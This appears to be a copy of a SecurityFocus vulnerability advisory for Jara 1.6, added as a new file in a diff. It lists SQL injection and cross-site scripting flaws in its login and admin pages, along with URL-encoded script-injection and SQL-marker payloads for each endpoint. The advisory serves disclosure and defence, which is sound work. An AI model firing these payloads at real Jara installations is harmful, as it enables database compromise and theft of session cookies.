@@ -1,0 +1,58 @@
+source: http://www.securityfocus.com/bid/55145/info
+
+Jara is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Jara 1.6 is vulnerable; other versions may also be affected. 
+
+SQL Injection Vulnerabilities:
+
+http://example.com/login.php (POST - username)
+
+http://example.com/login.php (POST - password)
+
+http://example.com/admin/delete_page.php?id='%2BNSFTW%2B&apos;
+
+http://example.com/admin/delete_post.php?id='%2BNSFTW%2B&apos;
+
+http://example.com/admin/delete_category.php?id='%2BNSFTW%2B&apos;
+
+http://example.com/admin/delete_user.php?id='%2BNSFTW%2B&apos;
+
+http://example.com/admin/edit_page.php?id='%2BNSFTW%2B&apos;
+
+http://example.com/admin/edit_user.php?id='%2BNSFTW%2B&apos;
+
+http://example.com/admin/edit_post.php (POST - id)
+
+http://example.com/admin/edit_category.php (POST - id)
+
+
+Cross-site scripting Vulnearbilities:
+
+http://example.com/view.php?id='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0031F8)%3C/script%3E
+
+http://example.com/page.php?id='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x003214)%3C/script%3E
+
+http://example.com/category.php?id='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0032D5)%3C/script%3E
+
+http://example.com/login.php (POST - username)
+
+http://example.com/login.php (POST - password)
+
+http://example.com/admin/delete_page.php?id='%3E%3Cscript%3Enetsparker(9)%3C/script%3E
+
+http://example.com/admin/delete_category.php?id='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x003548)%3C/script%3E
+
+http://example.com/admin/delete_post.php?id='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0034CE)%3C/script%3E
+
+http://example.com/admin/delete_user.php?id='%3E%3Cscript%3Enetsparker(9)%3C/script%3E
+
+http://example.com/admin/edit_post.php?id='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0034D5)%3C/script%3E
+
+http://example.com/admin/edit_category.php?id='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x003542)%3C/script%3E
+
+http://example.com/admin/edit_page.php?id='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x003569)%3C/script%3E
+
+http://example.com/admin/edit_user.php?id='%3E%3Cscript%3Enetsparker(9)%3C/script%3E
